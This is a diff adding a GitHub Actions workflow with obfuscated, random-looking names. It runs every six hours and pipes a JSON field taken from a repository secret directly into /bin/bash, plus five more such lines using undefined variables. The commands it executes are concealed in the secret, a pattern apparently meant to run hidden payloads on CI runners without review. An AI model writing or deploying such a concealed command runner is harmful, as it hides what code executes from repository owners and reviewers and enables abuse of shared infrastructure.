@@ -1,0 +1,22 @@
+name: xiaokaifa4178
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaokaifa4178
+        env:
+          fuuxf07153: ${{ secrets.fuuxf07153 }}
+        run: |
+          echo $fuuxf07153 | jq -r .sdny78 | /bin/bash
+          echo $kfoxc039 | jq -r .ycyj1 | /bin/bash
+          echo $ecnm6 | jq -r .t0133 | /bin/bash
+          echo $epxhk563 | jq -r .v337 | /bin/bash
+          echo $ojv564 | jq -r .gj64239 | /bin/bash
+          echo $ehhfe884 | jq -r .w01 | /bin/bash
+
